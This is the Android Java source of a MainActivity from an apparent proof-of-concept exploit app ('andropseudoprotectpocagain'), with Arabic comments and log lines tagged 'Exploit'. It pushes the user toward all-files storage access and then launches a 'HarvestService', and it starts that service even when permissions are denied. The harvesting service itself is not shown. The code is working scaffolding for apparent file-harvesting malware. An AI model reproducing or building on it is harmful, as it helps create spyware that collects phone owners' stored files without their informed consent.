package com.nasr.andropseudoprotectpocagain;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_STORAGE_LEGACY = 100;
    private static final int REQUEST_MANAGE_STORAGE = 101;
    private static final int REQUEST_NOTIFICATIONS = 102;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.i("Exploit", "LaunchActivity started");

        // التحقق من إذن الإشعارات لأندرويد 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                Log.i("Exploit", "Requesting notification permission...");
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.POST_NOTIFICATIONS},
                        REQUEST_NOTIFICATIONS);
                return;
            }
        }

        // التحقق من أذونات التخزين
        if (isStoragePermissionGranted()) {
            Log.i("Exploit", "Storage permissions OK, launching service");
            startHarvestService();
        } else {
            Log.i("Exploit", "Storage permissions missing, requesting...");
            requestStorageAccess();
        }
    }

    private boolean isStoragePermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        } else {
            return true;
        }
    }

    private void requestStorageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Log.i("Exploit", "Requesting MANAGE_EXTERNAL_STORAGE via system settings");
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
            } catch (Exception e) {
                Log.e("Exploit", "Failed to open manage storage screen", e);
                requestLegacyStoragePermission();
            }
        } else {
            requestLegacyStoragePermission();
        }
    }

    private void requestLegacyStoragePermission() {
        Log.i("Exploit", "Requesting legacy READ/WRITE permissions");
        ActivityCompat.requestPermissions(this,
                new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                },
                REQUEST_STORAGE_LEGACY);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MANAGE_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Log.i("Exploit", "MANAGE_EXTERNAL_STORAGE granted");
                    startHarvestService();
                } else {
                    Log.e("Exploit", "MANAGE_EXTERNAL_STORAGE denied");
                    Toast.makeText(this, "Storage access is required", Toast.LENGTH_LONG).show();
                    requestLegacyStoragePermission();
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_NOTIFICATIONS) {
            boolean granted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            Log.i("Exploit", "Notification permission " + (granted ? "granted" : "denied"));

            if (isStoragePermissionGranted()) {
                startHarvestService();
            } else {
                requestStorageAccess();
            }
        }

        if (requestCode == REQUEST_STORAGE_LEGACY) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Log.i("Exploit", "Legacy storage permissions granted");
                startHarvestService();
            } else {
                Log.e("Exploit", "Legacy storage permissions denied");
                Toast.makeText(this, "Storage permissions are required", Toast.LENGTH_LONG).show();
                startHarvestService(); // حاول على أي حال
            }
        }
    }

    private void startHarvestService() {
        Log.i("Exploit", "Starting HarvestService...");
        startService(new Intent(this, HarvestService.class));
        finish(); // إغلاق النشاط
    }
}